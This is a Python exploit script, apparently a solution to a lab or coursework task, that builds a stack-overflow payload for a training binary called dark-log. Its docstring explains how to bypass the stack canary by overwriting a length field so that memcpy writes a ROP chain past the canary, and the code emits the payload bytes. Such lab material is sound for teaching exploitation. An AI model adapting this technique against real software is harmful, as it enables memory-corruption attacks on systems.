#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log (canary bypass).

``dark-log`` is a non-PIE binary with an NX, randomised stack and it is built
with ``-fstack-protector-all``: a canary sits at ``rbp-0x8``, *above* the local
variables, so a plain ``gets()`` overflow cannot reach the return address
without destroying the canary.

The trick is the second write primitive of ``input()``:

    struct log_frame { char expression[128]; char logMsg[128]; int len; char pad[8]; };
    f.len = 0;
    gets(f.expression);                                /* full overflow */
    memcpy(f.logMsg + f.len, f.expression, 128);       /* second write */

Layout relative to ``rbp``:

    rbp-0x120 : expression[128]     (offset 0x000)
    rbp-0x0a0 : logMsg[128]         (offset 0x080)
    rbp-0x020 : len                 (offset 0x100)
    rbp-0x008 : canary  <-- must stay untouched
    rbp+0x000 : saved rbp
    rbp+0x008 : return address

``gets`` lets us overwrite ``len`` (it is *below* the canary), and then
``memcpy`` copies our first 128 bytes to ``logMsg + len``.  With ``len = 160``
the destination is exactly ``rbp``, so the copy rewrites the saved rbp and the
return address **above** the canary: the canary keeps its value and the check
at the epilogue succeeds.

The 128 bytes that get copied to ``rbp`` are a small ROP chain:

    rbp+0x00 : "AAAAAAAA"    (saved rbp, discarded by leave)
    rbp+0x08 : pop rdi ; ret (0x4018a3, inside __libc_csu_init)
    rbp+0x10 : 4
    rbp+0x18 : ret
    rbp+0x20 : grade_eval    -> prints "Hope A will be your grade!"

The input itself must stay shorter than 280 bytes (0x118), otherwise the NUL
terminator written by ``gets`` would already damage the first canary byte.
"""
import struct
import sys

POP_RDI = 0x4018A3      # pop rdi ; ret  (inside __libc_csu_init)
RET = 0x4018B0          # ret            (__libc_csu_fini)
GRADE_EVAL = 0x401677

def q(x):
    return struct.pack("<Q", x)

chain = b"A" * 8
chain += q(POP_RDI) + q(4) + q(RET) + q(GRADE_EVAL)
chain = chain.ljust(0x80, b"C")        # 128 bytes: full memcpy source

payload = chain                        # offset 0x000: expression[]
payload += b"D" * 0x80                 # offset 0x080: logMsg[]
payload += struct.pack("<i", 0xA0)     # offset 0x100: len = 160
payload += b"E" * (0x117 - len(payload))   # offset 0x104..0x116: pad

assert len(payload) == 0x117
assert b"\n" not in payload
assert payload[0x100:0x104] == struct.pack("<i", 160)

sys.stdout.buffer.write(payload + b"\n")
